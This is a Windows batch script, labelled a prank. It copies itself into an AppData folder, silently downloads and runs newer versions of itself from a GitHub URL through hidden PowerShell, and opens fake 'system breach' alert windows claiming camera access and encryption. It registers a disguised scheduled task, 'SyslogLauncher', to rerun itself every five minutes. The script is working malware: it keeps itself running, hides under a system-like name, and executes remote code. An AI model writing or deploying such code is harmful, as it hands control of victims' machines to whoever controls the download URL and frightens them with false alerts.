@echo off
setlocal enabledelayedexpansion

:: === CONFIGURATION ===
set "BASE=%APPDATA%\SysCache"
set "SELF=%BASE%\launcher.cmd"
set "VERSION_URL=https://raw.githubusercontent.com/maiz-an/atck-h/main/version.txt"
set "SELF_URL=https://raw.githubusercontent.com/maiz-an/atck-h/main/launcher.cmd"
set "LOCAL_VER=%BASE%\local_version.txt"
set "REMOTE_VER=%TEMP%\rv.txt"
:: =====================

:: Create folder
if not exist "%BASE%" mkdir "%BASE%"

:: Self‑install (copy ourselves to BASE)
if /i not "%~f0"=="%SELF%" (
    copy /Y "%~f0" "%SELF%" >nul
)

:: Check for updates
powershell -WindowStyle Hidden -Command "try { Invoke-WebRequest -Uri '%VERSION_URL%' -OutFile '%REMOTE_VER%' -ErrorAction Stop } catch { exit 1 }" >nul 2>&1
if exist "%REMOTE_VER%" (
    set /p REMOTE=<"%REMOTE_VER%"
    if exist "%LOCAL_VER%" set /p LOCAL=<"%LOCAL_VER%"
    if not "!LOCAL!"=="!REMOTE!" (
        echo Updating from !LOCAL! to !REMOTE! ...
        powershell -WindowStyle Hidden -Command "try { Invoke-WebRequest -Uri '%SELF_URL%' -OutFile '%TEMP%\update.cmd' -ErrorAction Stop } catch { exit 1 }" >nul 2>&1
        if exist "%TEMP%\update.cmd" (
            :: Rename current script (still running) to .old
            move /Y "%SELF%" "%SELF%.old" >nul
            :: Move new version into place
            move /Y "%TEMP%\update.cmd" "%SELF%" >nul
            :: Update version file
            echo !REMOTE! > "%LOCAL_VER%"
            :: Launch the new version
            start "" "%SELF%"
            exit
        ) else (
            echo Failed to download update.
        )
    )
)

:: === PRANK CODE (embedded) ===
title SYSTEM BREACH DETECTED
color 0a
for /l %%i in (1,1,5) do (
    start "SECURITY ALERT %%i" cmd /c "color 4 && title CRITICAL ERROR %%i && echo. && echo [!] Unauthorized Access Detected... && echo. && echo Hacking Laptop... %%i%% && echo. && echo Accessing Camera... && echo Accessing Files... && echo Encrypting Data... && echo. && echo DO NOT TURN OFF YOUR COMPUTER! && echo. && echo Press any key to attempt recovery... && pause > nul"
)
timeout /t 2 > nul
:: =============================

:: Ensure scheduled task runs this script every 5 minutes
schtasks /create /tn "SyslogLauncher" /tr "cmd /c start /min \"\" \"%SELF%\"" /sc minute /mo 5 /f >nul 2>&1

endlocal